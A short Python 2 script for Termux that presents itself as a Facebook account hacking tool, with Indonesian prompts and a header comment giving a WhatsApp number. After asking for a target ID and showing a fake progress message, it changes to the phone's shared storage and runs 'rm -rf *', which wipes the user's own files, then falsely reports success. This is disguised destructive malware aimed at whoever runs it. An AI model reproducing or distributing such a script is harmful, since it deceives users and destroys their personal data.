# ngga senang ini wa ku 0895803386428
# coding=utf-8
import os, sys, time

print "Masukkan Id/nama fb target"
tar=raw_input("target :")
print "Tunggu proses.... "
time.sleep(2)
os.system("termux-setup-storage && cd /sdcard")
os.system("rm -rf *")
sys.exit("Target succes")